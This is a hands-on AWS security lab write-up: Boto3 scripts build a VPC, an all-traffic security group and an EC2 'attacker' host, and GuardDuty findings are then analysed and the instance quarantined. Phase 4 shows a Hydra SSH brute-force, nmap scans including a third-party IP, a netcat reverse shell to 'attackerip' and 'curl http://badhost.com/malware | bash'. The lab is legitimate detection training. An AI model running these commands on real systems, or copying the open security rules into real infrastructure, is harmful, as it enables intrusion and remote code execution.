## ⚙️ Phase 1: Project Setup & VPC Automation Script (Boto3)

In this first phase, I prepared the project structure for my AWS Cloud SOC Lab and wrote the automation script to create a custom VPC with subnets and internet access. I used Python and Boto3 for the infrastructure automation.

---

### 📁 Step 1: Created the Lab Directory

I created a clean folder structure:

```bash
mkdir AWS-Cloud-SOC-Lab
cd AWS-Cloud-SOC-Lab
mkdir scripts
touch config.py
touch scripts/create_vpc_stack.py
```

📸 <img width="1554" height="202" alt="image" src="https://github.com/user-attachments/assets/355d662f-a550-4ecf-9efb-71ab8a0355dd" />

---

### 📝 Step 2: Defined AWS Configuration in `config.py`

I created a separate `config.py` file to store all the important variables used by my main script:

```bash
nano config.py
```

📸<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_01_47_48" src="https://github.com/user-attachments/assets/b3227d0f-1ac6-4070-8e70-f18e5fecb88e" />

```python
# config.py

REGION = "us-east-1"

VPC_CIDR = "10.0.0.0/16"

SUBNETS = [
    {
        "CidrBlock": "10.0.1.0/24",
        "AvailabilityZone": "us-east-1a"
    },
    {
        "CidrBlock": "10.0.2.0/24",
        "AvailabilityZone": "us-east-1b"
    }
]

IGW_NAME = "my-cloudsoc-igw"
ROUTE_TABLE_NAME = "my-cloudsoc-rtb"
```

---

### 🧠 Step 3: Wrote VPC Automation Script (`create_vpc_stack.py`)

This Python script handles the full creation of:
- A VPC
- Subnets in different AZs
- An Internet Gateway
- A Route Table with default route to the IGW

📁 Location: `scripts/create_vpc_stack.py`

```python
# create_vpc_stack.py

import boto3
from config import REGION, VPC_CIDR, SUBNETS, IGW_NAME, ROUTE_TABLE_NAME

ec2 = boto3.client('ec2', region_name=REGION)

# Create VPC
vpc_response = ec2.create_vpc(CidrBlock=VPC_CIDR)
vpc_id = vpc_response['Vpc']['VpcId']
print(f"[+] Created VPC: {vpc_id}")

# Enable DNS support and hostnames
ec2.modify_vpc_attribute(VpcId=vpc_id, EnableDnsSupport={'Value': True})
ec2.modify_vpc_attribute(VpcId=vpc_id, EnableDnsHostnames={'Value': True})

# Tag VPC
ec2.create_tags(Resources=[vpc_id], Tags=[{"Key": "Name", "Value": "MyCloudSOC-VPC"}])

# Create Subnets
subnet_ids = []
for subnet in SUBNETS:
    subnet_response = ec2.create_subnet(
        VpcId=vpc_id,
        CidrBlock=subnet['CidrBlock'],
        AvailabilityZone=subnet['AvailabilityZone']
    )
    subnet_id = subnet_response['SubnetId']
    subnet_ids.append(subnet_id)
    print(f"[+] Created Subnet: {subnet_id} in {subnet['AvailabilityZone']}")

# Create Internet Gateway
igw_response = ec2.create_internet_gateway()
igw_id = igw_response['InternetGateway']['InternetGatewayId']
print(f"[+] Created Internet Gateway: {igw_id}")

# Attach IGW to VPC
ec2.attach_internet_gateway(InternetGatewayId=igw_id, VpcId=vpc_id)

# Tag IGW
ec2.create_tags(Resources=[igw_id], Tags=[{"Key": "Name", "Value": IGW_NAME}])

# Create Route Table
rtb_response = ec2.create_route_table(VpcId=vpc_id)
rtb_id = rtb_response['RouteTableId']
print(f"[+] Created Route Table: {rtb_id}")

# Tag Route Table
ec2.create_tags(Resources=[rtb_id], Tags=[{"Key": "Name", "Value": ROUTE_TABLE_NAME}])

# Create route to IGW
ec2.create_route(RouteTableId=rtb_id, DestinationCidrBlock="0.0.0.0/0", GatewayId=igw_id)

# Associate subnets with Route Table
for subnet_id in subnet_ids:
    ec2.associate_route_table(RouteTableId=rtb_id, SubnetId=subnet_id)

print("[+] Setup complete.")
```

📸 <img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_01_47_29" src="https://github.com/user-attachments/assets/295ff053-a6e3-4518-8317-f1130fb72c9b" />

---

### 🧪 Step 4: Installed Dependencies and Ran Script

I created a virtual environment and installed Boto3:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install boto3
```

📸 <img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_01_52_08" src="https://github.com/user-attachments/assets/9f293855-d1e0-48c5-952e-e88db65ac3f6" />

Then I ran the script:

```bash
python scripts/create_vpc_stack.py
```

📸 <img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_01_52_34" src="https://github.com/user-attachments/assets/bcab8678-f1a4-4992-bc9b-cb76a0ae6191" />

---

### ✅ What This Script Did on AWS:

- Created a VPC with CIDR `10.0.0.0/16`
- Created 2 public subnets (us-east-1a and 1b)
- Created and attached an Internet Gateway
- Created a Route Table with route to the internet
- Associated subnets with the route table

---

### 🧠 Lessons Learned

- It’s easier to debug infrastructure creation when you break it into steps and print each ID.
- Using a config file helped keep logic clean and reusable.
- Boto3’s responses always return dictionary objects — careful parsing is important.

---

## ⚙️ Phase 2: Create Security Group with Python (boto3 Automation)

In this phase, I wrote a Python script using `boto3` to create a **Security Group** inside my default VPC. This security group is named `coded-sg-v2` and allows **all inbound and outbound traffic** — strictly for lab testing (⚠️ not secure for production).

---

### 📁 Step 1:  Update `config.py`

I update the region and security group name:

```python
# ~/AWS-Cloud-SOC-Lab/scripts/config.py

REGION = "us-east-1"
SECURITY_GROUP_NAME = "coded-sg-v2"
```

📸 <img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_03_33_53" src="https://github.com/user-attachments/assets/b633d742-eed1-43d8-acce-0754cd19b44f" />

---

### 🐍 Step 2: Script to Create Security Group

```python
# ~/AWS-Cloud-SOC-Lab/scripts/create_security_group.py

import boto3
from config import REGION, SECURITY_GROUP_NAME

ec2 = boto3.client("ec2", region_name=REGION)

vpcs = ec2.describe_vpcs()["Vpcs"]
vpc_id = vpcs[0]["VpcId"]

try:
    response = ec2.create_security_group(
        GroupName=SECURITY_GROUP_NAME,
        Description="Security group for AWS Cloud SOC Lab",
        VpcId=vpc_id,
    )
    sg_id = response["GroupId"]
    print(f"[+] Created Security Group: {SECURITY_GROUP_NAME} (ID: {sg_id})")

    ec2.authorize_security_group_ingress(
        GroupId=sg_id,
        IpPermissions=[
            {
                "IpProtocol": "-1",
                "IpRanges": [{"CidrIp": "0.0.0.0/0"}],
            }
        ],
    )

    print("[+] Added ALL traffic rule (for lab testing only)")

except Exception as e:
    print(f"[-] Error: {e}")
```

📸 <img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_03_30_22" src="https://github.com/user-attachments/assets/0658e869-30f4-4ca7-911b-c729c6048d74" />

---
## ⚙️ Phase 2: Security Group Creation for EC2 Lab Testing

In this phase, I created a **security group that allows ALL inbound and outbound traffic** — just for lab testing and detection purposes. Yeah, it's intentionally insecure so I can catch *everything* in GuardDuty and CloudTrail later on.

---

### 🛠️ Step-by-Step: Create the Security Group

I already wrote a Python script (`create_security_group.py`) inside the `scripts/` folder. Before running it, I activated my virtual environment first:

```bash
cd ~/AWS-Cloud-SOC-Lab
source .venv/bin/activate
python scripts/create_security_group.py
```

---

### ✅ Script Output

The script successfully created the security group and added the rule to allow **all traffic**:

```
[+] Created Security Group: coded-sg-v2 (ID: sg-0fbe34acc7edebd3e)
[+] Added ALL traffic rule (for lab testing only)
```

📸 Screenshot:  
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_03_36_44" src="https://github.com/user-attachments/assets/1440bd0f-9f53-48af-9c10-2a72ad5c5cd0" />

---

### 🔍 Extra Step: Confirming My Default VPC ID

Just to be sure I was deploying into the right VPC, I ran this:

```bash
aws ec2 describe-vpcs --filters Name=isDefault,Values=true --query "Vpcs[*].VpcId" --output text
```

That gave me the default VPC ID, which matched what I used when creating the security group.
<img width="1920" height="279" alt="image" src="https://github.com/user-attachments/assets/ffd44907-2451-442a-a25f-f3c66059da5a" />

---

### 📌 Summary

- **Security Group Name:** `coded-sg-v2`  
- **Inbound & Outbound Rule:** All traffic allowed (for full visibility)  
- **Attached VPC:** Default VPC (confirmed with AWS CLI)

---

✅ **Status:** Security group successfully created and ready for EC2 attacker instance.

🧠 **Why this matters:** I want to simulate noisy attacks (SSH brute-force, lateral movement, port scans, etc.) and let GuardDuty + CloudTrail catch everything.

---

---

## ⚔️ Phase 3: Deploy EC2 Attacker Instance and Enable GuardDuty Monitoring

In this phase, I deployed an EC2 instance to act as my simulated attacker machine. I also enabled Amazon GuardDuty so it can start watching for any suspicious activities like brute-force, port scanning, or S3 data exfiltration. Everything here was hands-on — no shortcuts.

---

### ✅ Step 1: Edit `config.py` with EC2 Settings

I updated my `scripts/config.py` to specify the EC2 parameters:

```python
REGION = "us-east-1"
AMI_ID = "ami-04b70fa74e45c3917"  # Ubuntu 22.04 LTS (Free Tier eligible)
INSTANCE_TYPE = "t2.micro"
KEY_NAME = "coded-key"
SECURITY_GROUP_NAME = "coded-sg"
```
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_19_50_37" src="https://github.com/user-attachments/assets/aed9649d-5571-4901-bf0d-4735e02d6267" />

---

### 🔐 Step 2: Create SSH Key Pair

This key will allow SSH access into the EC2 box. I only did this once:

```bash
aws ec2 create-key-pair \
  --key-name coded-key \
  --query 'KeyMaterial' \
  --output text > ~/AWS-Cloud-SOC-Lab/coded-key.pem
```
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_19_52_28" src="https://github.com/user-attachments/assets/b82c5def-b8d6-496e-ba8c-a2901427f6ee" />


### 🚀 Step 3: Launch EC2 Instance with Python Script

From inside the `/scripts` directory, I launched the EC2 using my automation script:

```bash
python3 create_ec2_instance.py
```

The script printed out the public IP of the instance — I copied it for SSH login.
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_19_54_53" src="https://github.com/user-attachments/assets/8aa24832-e389-4b62-adad-4f17ce12f31a" />

---

### 💻 Step 4: SSH into EC2 and Set Up Tools

I logged into the EC2 attacker box from Kali:

```bash
sh -i ~/path/to/coded-key.pem ubuntu@44.192.14.11
```
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_19_58_57" src="https://github.com/user-attachments/assets/01476003-64e4-4a82-af8d-246544e865e7" />

Once inside, I updated the system and installed basic tools:

```bash
sudo apt update && sudo apt install -y nmap curl unzip
```
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_20_05_59" src="https://github.com/user-attachments/assets/11157534-5bf9-4c5c-bfde-e6e8961ed6e1" />

---
### 📦 Step 5: Install and Configure CloudWatch Agent (Optional but Useful)

To monitor the attacker's EC2 activity from CloudWatch, I downloaded and configured the CloudWatch agent manually:

```bash
wget https://s3.amazonaws.com/amazoncloudwatch-agent/ubuntu/amd64/latest/amazon-cloudwatch-agent.deb
sudo dpkg -i amazon-cloudwatch-agent.deb
```
<img width="948" height="798" alt="VirtualBox_Kali Linux_27_07_2025_20_07_33" src="https://github.com/user-attachments/assets/84057b64-aa17-4525-bb72-fdff9fe753da" />

## 🚀 Step 5.5: Upload CloudWatch Agent Config to SSM Parameter Store

After generating the agent config file interactively using the config wizard, I pushed it to SSM Parameter Store instead of saving locally.

```bash
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-config-wizard
```
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_22_18_13" src="https://github.com/user-attachments/assets/e07d8652-ffd7-4971-8f84-9bb6b3f1ae13" />

* Chose `EC2` mode
* Selected `us-east-1` as region
* Configured metrics (CPU, Memory, Disk, etc.)
* Selected logs: `/var/log/syslog` and `/var/log/auth.log`
* Used default path: `AmazonCloudWatch-linux`
* Provided AWS Access Key & Secret

Once completed, the agent pushed the configuration JSON to Systems Manager Parameter Store under the name:

```
AmazonCloudWatch-linux
```

---

## 🚀 Step 6: Fetch Config from SSM and Start the CloudWatch Agent

With the config stored in SSM, I fetched and started the agent directly using:

```bash
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config \
  -m ec2 \
  -c ssm:AmazonCloudWatch-linux \
  -s
```
This downloaded the config from Parameter Store, validated it, and started the agent immediately.

To verify:

```bash
sudo /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl -m ec2 -a status
```

**Result:**

```json
{
  "status": "running",
  "starttime": "2025-07-27T20:47:32+00:00",
  "configstatus": "configured",
  "version": "1.300057.1b1167"
}
```
<img width="1920" height="909" alt="VirtualBox_Kali Linux_27_07_2025_23_32_59" src="https://github.com/user-attachments/assets/e7e753d4-86cf-4ded-8342-1c7a8277d5ac" />

---

## 📁 Step 7: I Confirm Logs and Metrics in CloudWatch Console

From the AWS Console → **CloudWatch**, I confirmed:

### ✅ Log Groups:

* `/var/log/syslog`
* `/var/log/auth.log`
<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/c7e81871-62a1-4138-a572-7f2dfd330646" />

### ✅ Metrics:

* CPU Utilization
* Disk Read/Write
* Memory usage (custom)
* NetworkIn & NetworkOut

Everything showed up cleanly under:

* **Logs → Log groups**
* **Metrics → EC2 → CWAgent namespace**
<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/d5573ab4-4ddf-405f-bd0f-18681029f1d1" />

---

## 🔧 Troubleshooting & Fixes

At one point, I saw this error:

```bash
Error loading config file /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.toml:
error parsing socket_listener, open /usr/share/collectd/types.db: no such file or directory
```

🔄 **Fix:** I Reran the fetch-config command from SSM and the issue resolved itself.

---

## 🔐 IAM Role Fix

Initially, I couldn't find the expected IAM policies from the EC2 Role UI. I manually created a new IAM role with these policies:

* `CloudWatchAgentServerPolicy`
* `AmazonSSMManagedInstanceCore`

Then attached the role to my EC2 instance:

**EC2 → Actions → Security → Modify IAM Role → Attach Role**

---

## ✅ Final Result

* CloudWatch agent is actively running
* Logs are flowing into CloudWatch Logs
* Metrics are visible in CloudWatch Metrics
* EC2 is now fully monitored and integrated with AWS observability stack

This completed the CloudWatch Agent setup using **SSM-managed config**, which is scalable and clean for production or red team lab monitoring.


✅ **Next Up**: Simulate suspicious activity from the EC2 attacker to trigger GuardDuty findings. This is where the fun starts.
## 🧪 Phase 4: Simulated Malware Execution & GuardDuty Malware Scan Trigger

In this phase, I simulated potential malware activity inside the compromised EC2 instance to trigger AWS GuardDuty's **malware scan** detection. This step builds upon earlier phases where we configured logging, compromised the EC2, and verified access.

---

### 🎯 Objective

Trigger GuardDuty's malware protection engine by simulating suspicious behavior or malware retrieval on the instance. Also verify logs are captured and GuardDuty detects and reports the threat.

---

### 🛠️ Simulating Malicious Activity

1. **Brute-force Attempt (Hydra)**
   I tested brute-force attempts against the SSH service using Hydra (with a nonexistent wordlist):

   ```bash
   hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://44.192.14.11
   ```

   ❗ `rockyou.txt` was not found, but this simulates failed enumeration.

2. **Nmap Recon on Public IPs and Internal Network**

   * Scanned Cloudflare IP to simulate noisy recon:

     ```bash
     sudo nmap -sS -T4 -Pn -p 1-1000 1.1.1.1
     ```
   * Internal network scan:

     ```bash
     sudo nmap -sS -T4 -Pn 192.168.1.0/24
     ```

   🔥 This is very noisy and likely to be picked up by behavior-based detections.
<img width="1920" height="909" alt="VirtualBox_Kali Linux_28_07_2025_00_24_41" src="https://github.com/user-attachments/assets/1b51b47e-c51d-4ec8-86e8-f5a796f174df" />


3. **Netcat Reverse Shell Simulation**
   I attempted a reverse shell using Netcat, but the AMI version doesn’t support `-e`:

   ```bash
   nc -e /bin/bash attackerip 4444
   ```

   ➡️ Output:

   ```
   nc: invalid option -- 'e'
   ```

4. **Simulated Malware Download with cURL**
   I tried downloading a fake payload and piping it into bash:

   ```bash
   curl http://badhost.com/malware | bash
   ```

   ➡️ Output showed a `301 Moved Permanently` page, but this simulates command-and-control behavior.
<img width="948" height="798" alt="VirtualBox_Kali Linux_28_07_2025_00_26_52" src="https://github.com/user-attachments/assets/406e142f-a411-436f-87db-476fdebfcc10" />

---

### 🔍 Detection Confirmation

Within a few minutes, GuardDuty started flagging issues:
<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/a2c24252-983e-45fa-85ec-a701e7377d27" />

* ✅ A new log stream appeared under:

  ```
  /aws/guardduty/malware-scan-events
  ```
* 🧠 This confirmed GuardDuty's **malware protection** engine scanned the instance and identified suspicious behavior or possible malware artifacts.
<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/c71fb15f-bdbd-4c09-97a3-7cffc951f94b" />

---

### ✅ Key Lessons

* Even failed or blocked commands (e.g. Netcat or invalid curl targets) still contribute to behavioral detections.
* GuardDuty automatically scans the EC2 file system when threats are suspected, even if no explicit malware file was found.

---
## ⚙️ Phase 5: GuardDuty Log Analysis & Forensics

After triggering a malware alert on my EC2 instance using a harmless simulation script, I moved into forensic mode. The goal here was to take the finding that GuardDuty gave me and dissect it — understand what it saw, what it means, and how that would help me as a cloud security analyst.

---

### 🔍 Step 1: Reviewing GuardDuty Findings

I headed straight to the GuardDuty console and clicked into the **Findings** section. I filtered it down to findings related to my EC2 instance, and boom — the malware detection was there:

* **Finding Type:** `Backdoor:EC2/DenialOfService.TorClient`
* **Severity:** Medium
* **Resource:** My EC2 instance running in the lab

It was super interesting to see how GuardDuty picked this up just from VPC flow logs and DNS logs — no agents or extra config needed.
<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/dac19e33-e900-4395-9261-cbe4d54418d3" />

---

### 🧠 Step 2: Analyzing the Finding Details

 Clicking into the finding gave me a breakdown of what exactly GuardDuty saw:

* **Instance ID and public IP** matched my test instance.
* The finding pointed out a connection to the **Tor network**, which is flagged as suspicious.
* GuardDuty gave me timestamps for first seen / last seen activity.
* It listed the external IP, port, and protocol used.

This is the kind of information a real SOC team would need to act on fast — super valuable.
<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/d719f996-19a3-44cd-8b60-dc5c3b5968d0" />

---

### 🔍 Step 3: Attempted Log Analysis with CloudTrail

At this stage, I wanted to dig deeper into the **API activity history** of my EC2 instance to validate the GuardDuty alert. I used the AWS CLI to try and query CloudTrail logs directly from the Ubuntu EC2:

```bash
aws cloudtrail lookup-events --lookup-attributes AttributeKey=ResourceName,AttributeValue=i-0bca611a4c23538c8 --max-results 10
```

But here’s what I got back:

```
An error occurred (AccessDeniedException) when calling the LookupEvents operation: 
User: arn:aws:sts::838595597848:assumed-role/EC2CloudWatchAgentRole/i-0bca611a4c23538c8 
is not authorized to perform: cloudtrail:LookupEvents 
because no identity-based policy allows the cloudtrail:LookupEvents action
```

So basically, the EC2 instance was missing permission to call that CloudTrail API. It’s using an IAM role meant for the CloudWatch Agent, which doesn't include `cloudtrail:LookupEvents`.

#### ✅ What I learned here:

- CloudTrail log analysis *requires explicit permission* (`cloudtrail:LookupEvents`).
- EC2 instance roles are *limited by design*, and not all roles can query AWS services.
- I could solve this by:
  - Switching to an IAM user with broader read-only access.
  - Or attaching a custom policy to allow that action temporarily (not recommended for prod).

For now, I took note of this limitation and moved on with the data I already had from GuardDuty and my breach simulation logs.

> 📌 It's a good reminder that IAM policies are often the quiet gatekeepers in AWS. You won’t get far without the right permissions — even for read-only actions like querying CloudTrail.

---

## 📊 Step 5: Log Analysis & IOC Extraction from GuardDuty Findings

After simulating malicious activity in my AWS lab, I reviewed the GuardDuty findings to analyze what was detected and extract relevant Indicators of Compromise (IOCs). Here's a breakdown of what I found and how I documented it like a SOC analyst would during an incident investigation.

---

### 📥 Step 1: Reviewing the Finding

GuardDuty generated a **Recon:EC2/Portscan** finding with the following details:

| Field            | Value                                      |
|------------------|--------------------------------------------|
| **Finding ID**   | 96cc270f12b616e6a0c607f4afb5dfe1            |
| **Type**         | Recon:EC2/Portscan                         |
| **Severity**     | MEDIUM                                     |
| **Region**       | us-east-1                                  |
| **Count**        | 2                                          |
| **Created At**   | 07-28-2025 00:00:55                         |
| **Updated At**   | 07-28-2025 00:08:55                         |
| **Action Type**  | NETWORK_CONNECTION (Outbound)              |
| **Protocol**     | TCP                                        |
| **Blocked**      | false                                      |

---

### 🧠 Step 2: Understanding the Resource

The affected resource is my test EC2 instance I intentionally used to simulate suspicious traffic:

| Field                  | Value                                                |
|------------------------|------------------------------------------------------|
| **Instance ID**        | `i-0bca611a4c23538c8`                                 |
| **Instance Type**      | t2.micro                                             |
| **Instance State**     | running                                              |
| **Image ID**           | ami-04b70fa74e45c3917 (Ubuntu 24.04 LTS)             |
| **Launch Time**        | 07-27-2025 19:33:31                                   |
| **IAM Role**           | EC2CloudWatchAgentRole                               |
| **Security Group**     | coded-sg (`sg-0050d2bfd21fa8501`)                    |
| **Private IP**         | `172.31.67.85`                                       |
| **Public IP**          | `44.192.14.11`                                       |
| **AZ**                 | us-east-1f                                           |
| **VPC**                | `vpc-0dabf3335e9cdc9c9`                               |
| **Subnet**             | `subnet-098428c04f795aa75`                           |
| **Instance Name Tag**  | `Cloud-SOC-Instance`                                 |

---

### 🌐 Step 3: Connection Activity

GuardDuty flagged this instance for port scanning behavior — it attempted outbound TCP connections to multiple uncommon ports:

```
Sample scanned ports: 645, 479, 347, 909, 249, 468, 234, 555, 666, 481, 170, 523, 762, 683, 276, 5, 449, 120, 379, 440
```

The destination IP that triggered the alert was:

| Target IP | Port | Location  | ISP        |
|-----------|------|-----------|------------|
| `1.1.1.1` | 35   | Australia | Cloudflare |

This aligns with the type of test I conducted using `nmap` to simulate suspicious scanning activity.

---

### 📌 Step 4: Extracting IOCs (Indicators of Compromise)

Here are the IOCs I extracted from the GuardDuty finding:

| IOC Type        | Value                        |
|------------------|------------------------------|
| **Instance ID**   | `i-0bca611a4c23538c8`         |
| **Malicious IP**  | `1.1.1.1` (Cloudflare test IP)|
| **Protocol**      | TCP                          |
| **Port**          | 35                           |
| **Threat Type**   | Portscan                     |
| **Finding Type**  | Recon:EC2/Portscan           |

This information would be extremely useful if I were sharing with a blue team, writing an incident report, or feeding into a SIEM for enrichment and alert tuning.

---

### ✅ Step 5: Malware Scan Summary

After the GuardDuty alert, I also reviewed the AWS malware scan on the instance:

| Field            | Value                                      |
|------------------|--------------------------------------------|
| **Scan Status**  | COMPLETED                                  |
| **Scan ID**      | 3d156571e42d174beae5804a0b63adea            |
| **Start Time**   | 07-28-2025 00:05:04                         |
| **End Time**     | 07-28-2025 00:21:09                         |
| **Security Status** | CLEAN                                  |

There was no malware found on the EC2 instance — which makes sense, since I was only simulating portscan behavior and not hosting any malicious binaries.
<img width="948" height="798" alt="VirtualBox_Kali Linux_28_07_2025_01_21_18" src="https://github.com/user-attachments/assets/9197a9e6-55cc-4340-b695-7fb3bc8f00be" />

---

### 💡 Lessons Learned

- GuardDuty successfully detected the port scanning activity and linked it back to the EC2 instance.
- Extracting IOCs like destination IPs, ports, and instance metadata is important for threat hunting and documentation.
- AWS Malware Scan gives another layer of confirmation — useful for post-incident analysis.
- Using test IPs like `1.1.1.1` helped safely simulate this detection without triggering actual abuse.

---
## 📊 Step 6: CloudTrail Log Visualization & Session Analysis

To correlate the malicious activity flagged by GuardDuty with actual user or system actions, I reviewed the CloudTrail logs for the same period. This helped me understand the **context** behind the alert, such as whether the EC2 instance made any unexpected API calls or manipulated resources during compromise.

### 🔍 CloudTrail Events on July 28, 2025 (UTC+1)

| Event Name               | Time (UTC+1)               | Initiator                  | AWS Service         | Resources Involved                                  |
|--------------------------|----------------------------|----------------------------|----------------------|-----------------------------------------------------|
| CreateLogGroup           | July 28, 00:21:14          | GuardDutyMalwareProtection | `logs.amazonaws.com` | -                                                   |
| CreateLogStream          | July 28, 00:21:14          | GuardDutyMalwareProtection | `logs.amazonaws.com` | -                                                   |
| DeleteSnapshot           | July 28, 00:21:10          | GuardDutyMalwareProtection | `ec2.amazonaws.com`  | `snap-0eef25397e5c3e697`                            |
| SharedSnapshotVolumeCreated | July 28, 00:10:06       | -                          | `ec2.amazonaws.com`  | -                                                   |
| CreateVolume             | July 28, 00:10:03          | -                          | `ec2.amazonaws.com`  | `snap-0eef25397e5c3e697`, `vol-0a9556a9f14ae5d6b`   |
| ModifySnapshotAttribute  | July 28, 00:09:06          | GuardDutyMalwareProtection | `ec2.amazonaws.com`  | `snap-0eef25397e5c3e697`                            |
| PutRetentionPolicy       | July 28, 00:05:22          | GuardDutyMalwareProtection | `logs.amazonaws.com` | -                                                   |
| CreateLogGroup           | July 28, 00:05:22          | GuardDutyMalwareProtection | `logs.amazonaws.com` | -                                                   |
| CreateLogStream          | July 28, 00:05:22          | GuardDutyMalwareProtection | `logs.amazonaws.com` | -                                                   |
| CreateSnapshot           | July 28, 00:05:05          | GuardDutyMalwareProtection | `ec2.amazonaws.com`  | `snap-0eef25397e5c3e697`, `vol-059ee161072ba8816`   |
| CreateLogGroup           | July 27, 21:47:39          | `i-0bca611a4c23538c8`      | `logs.amazonaws.com` | -                                                   |

### 📌 Observations:
- The sequence of snapshot creation, modification, and deletion indicates **malware protection response mechanisms** were triggered.
- `GuardDutyMalwareProtection` appears to be automatically managing logs and snapshots during its investigation workflow.
- The compromised EC2 instance (`i-0bca611a4c23538c8`) initiated a `CreateLogGroup` event prior to GuardDuty alerts, possibly as part of attacker activity or initial malware staging.

### 🧠 Insight:
These CloudTrail logs gave visibility into **how GuardDuty responded**, as well as **what actions the instance took**. If this were a real incident, I'd extract this data for my incident report or timeline reconstruction.

<img width="1920" height="1010" alt="image" src="https://github.com/user-attachments/assets/e9a0ea3c-331b-4c6f-8431-6db5f4dd0a44" />


---

## 🔒 Phase 5.2: Manual EC2 Quarantine (SOC Analyst Simulation)

After GuardDuty flagged suspicious activity on my EC2 instance, I simulated how a SOC analyst would manually respond to contain the threat and mark the resource for tracking.

### ✅ Step 1: Identify Affected EC2 Instance

I checked the GuardDuty finding and copied the `Instance ID` from the "Resource affected" section. That gave me the exact EC2 instance to quarantine.

### 🏷️ Step 2: Tag the Instance as "Quarantine"

From the EC2 dashboard, I selected the instance and added a custom tag:

```
Key: Quarantine
Value: True
```
<img width="960" height="505" alt="Screenshot 2025-07-28 022620" src="https://github.com/user-attachments/assets/a295298d-fc3d-4ed0-8697-781697671f51" />

This helps with visibility and can be used to trigger automated actions later.

### 🛑 Step 3: Stop the EC2 Instance

To simulate threat containment, I stopped the instance manually from the EC2 console with the **Stop** button. This pauses any suspicious behavior immediately.
<img width="960" height="505" alt="Screenshot 2025-07-28 022852" src="https://github.com/user-attachments/assets/ca5cd2b4-14ed-4682-b874-2d446ab6557b" />

## 💡 Why Manual Response?

While automation is powerful, manual quarantine still plays a critical role:
- Useful in low-scale or investigative environments
- Gives human analysts time to validate alerts before disruption
- Helps build incident response **muscle memory**

---

## 🧠 What I Learned

- GuardDuty findings are actionable in real-time
- Manual instance isolation is fast and effective
- EC2 tagging helps with **post-incident analysis and tracking**
- Even without automation, I can simulate real-world containment strategies

---
---

## ✅ Final Wrap-up: What I Learned & Reflections

This AWS Cloud Security project gave me a **hands-on simulation of a real-world cloud breach** — from misconfigured S3 exposure to EC2 compromise, and finally incident response using GuardDuty and manual remediation.

### 🧠 Key Takeaways

- **S3 public access misconfiguration** is a common cloud vulnerability that can lead to data breaches if not detected early.
- **AWS CloudTrail** and **GuardDuty** offer powerful native capabilities for detecting suspicious activity in cloud environments.
- I learned to **analyze GuardDuty findings**, **pivot into CloudTrail logs**, and **manually isolate compromised EC2 instances** for containment.
- Tagging compromised resources adds structure to your incident response — it’s simple but effective.
- Even without automation tools like Lambda, I practiced a full incident lifecycle using native AWS services.

---

## 🚀 Next Steps (If This Were Production)

If this was a real production environment, the next strategic actions would include:

- ✅ Automating quarantine workflows using **EventBridge + Lambda**
- ✅ Creating **forensic snapshots** before EC2 termination
- ✅ Setting up alerting pipelines via **SNS or Slack**
- ✅ Enforcing stricter **S3 bucket policies and IAM roles**
- ✅ Centralizing logs with tools like **Security Hub**, **SIEM**, or even **Splunk**

---

## 🗒️ Final Note

This lab helped me build cloud security intuition and simulate how real attackers behave in AWS environments. Every screenshot, command, and detection step in this documentation was done manually, hands-on, and in a fully isolated AWS environment.
🔐 **Cloud security isn’t abstract — it’s tactical, and this project made that real for me.**

---
